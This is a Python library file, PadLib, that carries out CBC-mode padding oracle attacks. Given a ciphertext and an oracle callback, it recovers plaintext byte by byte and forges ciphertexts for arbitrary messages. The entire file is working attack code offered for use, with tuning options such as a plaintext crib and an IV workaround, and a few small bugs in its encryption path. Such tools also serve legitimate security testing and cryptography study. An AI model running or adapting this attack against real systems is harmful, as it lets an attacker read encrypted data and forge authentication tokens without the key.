#!/usr/bin/env python3
import sys

# Ross Bradley

STATE_FIND_PADDING = 0
STATE_FOUND_PADDING = 1
STATE_DECRYPT = 2

class PadLib(object):
	'''Class for exploiting CBC-mode padding oracles with PKCS#7 padding'''
	def __init__(self, ciphertext, callback, block_size=16, iv=None, append_test_blocks=False, crib='', verbose=False):
		'''
		cipertext: a valid ciphertext as bytes (decode the original from base64, ASCII hex etc.
		callback: a function that takes one input (a candidate ciphertext) and returns True if the ciphertext decrypted to a value with valid padding, or False otherwise
		block_size: size of the block cipher in bytes (default: 16)
		iv: an IV as bytes. If the IV is hard-coded and does not form part of the ciphertext it can be provided here. Use a null IV to obtain the intermediate state for the first ciphertext block
		append_test_blocks: whether to append the test blocks to the full ciphertext, or only send the 2x test blocks (default: False)
		crib: a string of characters that are expected to appear in the plaintext, ordered from most-likely to less likely
		verbose: shows individual byte decryption output if enable (default: False)
		'''

		# split the ciphertext into n-byte blocks
		self.blocks = [ciphertext[n:n+block_size] for n in range(0, len(ciphertext), block_size)]

		# store the callback function
		# this is a user-supplied function that will test the chosen ciphertext for us and return:
		#   True = valid padding
		#   False = invlaid padding
		self.callback = callback

		self.block_size = block_size

		# prepend an IV if provided
		# useful where the ciphertext does not include the IV (i.e. it is fixed)
		# if we don't know the fixed IV use a null IV to recover the intermediate state of block #0 and use set intersection to recover the plaintext/IV
		if iv is not None and len(iv) == block_size:
			self.blocks.insert(0, iv)
			self.first_block_idx = 1
		else:
			self.first_block_idx = 0

		self.num_blocks = len(self.blocks)

		self.append_test_blocks = append_test_blocks

		# save the crib if provided - used to speed up decryption
		self.crib = [ord(ch) for ch in crib]

		# whether we should print to stdout or not
		self.verbose = verbose

		# initalise the FSM
		self.state = STATE_FIND_PADDING

		# place to store plaintext results
		self.plain_blocks = []

		# record some very basic stats
		# TODO - more
		self.stats = 0

	def debug(self, msg, newline=False):
		if self.verbose:
			sys.stdout.write(msg)
			if newline:
				print()

	def build_candidate_list(self, ct_val, target):
		# increase our decryption efficiency
		#   we know the plaintext ends with valid padding, so we only need to test block_size values for the last byte
		#   once we have valid padding we know the last padding_size bytes should == padding_size
		#   if we know/can guess the plaintext alphabet (probably ASCII for most cases) we can prioritise tests for those values
		if self.state == STATE_FIND_PADDING:
			preferred = [n for n in range(1, self.block_size + 1)]
		elif self.state == STATE_FOUND_PADDING:
			preferred = [self.padding_byte]
		elif self.state == STATE_DECRYPT:
			preferred = [ch for ch in self.crib]

		# build the list of values we'd like to test for
		candidate_list = [ct_val ^ ch ^ target for ch in preferred]

		# append whatever values are left over just in case our guess/crib is wrong
		# order matters! we can't just use a set here - we need to append this stuff *after* our preferred candidates
		for n in range(256):
			if n not in candidate_list:
				candidate_list.append(n)
		return candidate_list

	def decrypt_block(self, idx):
		# get the block to decrypt (c_1)
		c_1 = self.blocks[idx]

		# decrypt each byte in turn, working from the right-most side
		plaintext = []

		# handle the last byte first - it's a slightly special case as the real padding may be 0x01 in which case we'll only get 1 "hit"
		# therefore we may need to check every possible value
		# if we get a "hit" using a value that doesn't match the original cipehrtext we'll know and can shortcut the search
		c_0 = [b for b in self.blocks[idx - 1]]

		hit = None
		for byte_val in self.build_candidate_list(self.blocks[idx - 1][-1], 1):
			self.debug(f'\r[Block {idx:2} | Byte {self.block_size-1}] Trying {byte_val:3}'.ljust(48))

			# record the attempt
			self.stats += 1

			c_0[-1] = byte_val

			# build the ciphertext to send to the oracle
			if self.append_test_blocks:
				# append two blocks (the modified block, and the one we're trying to decrypt) to the end of the valid ciphertext
				tmp = [block for block in self.blocks[self.first_block_idx:]]
				tmp.append(bytes(c_0))
				tmp.append(c_1)
			else:
				# just send the two blocks
				tmp = [bytes(c_0), c_1]

			test_case = b''.join(tmp)

			# query the oracle
			valid_padding = self.callback(test_case)
			if valid_padding:
				# if it's not the normal value, we found the padding for 0x1 so we can move on
				if byte_val != self.blocks[idx - 1][-1]:
					hit = byte_val
					break
				# if we haven't found any hit yet store it anyway (the normal padding may in fact be 0x1!)
				elif hit is None:
					hit = byte_val

		plain_byte = (hit ^ 1) ^ self.blocks[idx - 1][-1]
		plaintext.insert(0, plain_byte)

		# update the FSM state if this was the final block (it ends with padding)
		if self.state == STATE_FIND_PADDING and idx == self.num_blocks - 1:
			self.state = STATE_FOUND_PADDING
			self.padding_byte = plain_byte

		self.debug(f'\r[Block {idx:2} | Byte {self.block_size-1}] {plain_byte:02x} {chr(plain_byte) if chr(plain_byte).isprintable() else "."}'.ljust(48, ' '), newline=True)

		# handle the remaining bytes in the block
		for byte_idx in range(self.block_size - 2, -1, -1):
			# we need to get a "clean" previous ciphertext block each time
			c_0 = [b for b in self.blocks[idx - 1]]

			# update c_0 to match the target padding
			padding_num = self.block_size - byte_idx

			for pad_idx in range(self.block_size - 1, byte_idx, -1):
				c_0[pad_idx] = padding_num ^ (self.blocks[idx - 1][pad_idx] ^ plaintext[pad_idx - self.block_size])

			# test all possible values until we get a "hit" (i.e. we don't get an error response)
			hit = None
			for byte_val in self.build_candidate_list(self.blocks[idx - 1][byte_idx], padding_num):
				self.debug(f'\r[Block {idx:2} | Byte {byte_idx:2}] Trying {byte_val:3}'.ljust(48))
				c_0[byte_idx] = byte_val

				# record the attempt
				self.stats += 1

				# build the ciphertext to send to the oracle
				if self.append_test_blocks:
					# append two blocks (the modified block, and the one we're trying to decrypt) to the end of the valid ciphertext
					tmp = [block for block in self.blocks[self.first_block_idx:]]
					tmp.append(bytes(c_0))
					tmp.append(c_1)
				else:
					# just send the two blocks
					tmp = [bytes(c_0), c_1]

				test_case = b''.join(tmp)

				# query the oracle
				valid_padding = self.callback(test_case)
				if valid_padding:
					hit = byte_val
					break

			plain_byte = (hit ^ padding_num) ^ self.blocks[idx - 1][byte_idx]
			plaintext.insert(0, plain_byte)

			# update the FSM state if necessary
			if self.state == STATE_FOUND_PADDING and (self.block_size - byte_idx) < self.padding_byte:
				self.state = STATE_DECRYPT

			self.debug(f'\r[Block {idx:2} | Byte {byte_idx:2}] {plain_byte:02x} {chr(plain_byte) if chr(plain_byte).isprintable() else "."}'.ljust(48, ' '), newline=True)

		return bytes(plaintext)

	def decrypt(self):
		'''Decrypts the ciphertext'''
		plaintext = []
		idx = self.num_blocks

		try:
			while idx > 1:
				idx -= 1
				plaintext.insert(0, self.decrypt_block(idx))
				# we're done
				if idx == 1:
					break
		except Exception as e:
			print('ERROR during decrypt')
			print(e)
		finally:
			iv = self.blocks[0]
			result = {'iv': iv.hex(), 'plaintext':b''.join(plaintext).decode('utf8'), 'stats': self.stats}
			return result

	def encrypt(self, raw_message, known_ct=None, known_pt=None):
		'''
		raw_message: string to encrypt (will be padded)
		known_ct: a known ciphertext as bytes
		known_pt: a known plaintext for the known_ct as a string (will be padded)

		Note: providing a known CT/PT pair improves encryption time by saving on one block decryption
		'''
		# pad the message first - we can only encrypt messages that are multiples of 8 in length
		padding = self.block_size - (len(raw_message) % self.block_size)
		message = raw_message.encode('utf8') + bytes([padding for n in range(padding)])

		# chunk it up
		chunks = [message[n:n+self.block_size] for n in range(0, len(message), self.block_size)]

		# store the ciphertext blocks we create for our plaintext message
		ciphertexts = []

		# cheap shortcut to speed up encryption - we know the ciphertext X decrypts to the intermediate block Y, so pick the last block as X
		#  now we can just xor the final plaintext block with the intermediate block to get the previous block
		if known_ct is not None and known_pt is not None and len(known_ct) == len(known_pt):
			# recover the intermediate block for the final ciphertext block
			known_pt_chunks = [known_pt[n:n+self.block_size] for n in range(0, len(known_pt), self.block_size)]
			known_ct_chunks = [known_ct[n:n+self.block_size] for n in range(0, len(known_ct), self.block_size)]
			ib = bytes([known_ct_chunks[-2][n] ^ known_pt_chunks[-1][n] for n in range(self.block_size)])
			ciphertexts.append(known_ct_chunks[-1])

			# xor the final plaintext chunk with the known intermediate block to create the preceding ciphertext block
			plaintext = chunks.pop()
			ciphertexts.insert(0, bytes([plaintext[n] ^ ib[n] for n in range(self.block_size)]))
		else:
			# just pick a random ciphertext starting value
			ciphertexts.append(b'\x00'*16)

		# now we need to encrypt any remaining plaintext chunks
		while len(chunks) > 0:
			# decrypt the latest ciphertext block with a null IV to obtain the intermediate block
			self.blocks = [b'\x00'*self.block_size, ciphertexts[0]]
			ib = self.decrypt_block(1)
			# xor the plaintext block we want to encrypt with the intermediate block to create the precding ciphertext block
			plaintext = chunks.pop()
			ciphertexts.insert(0, bytes([plaintext[n] ^ ib[n] for n in range(self.block_size)]))

		return b''.join(ciphertexts).hex()

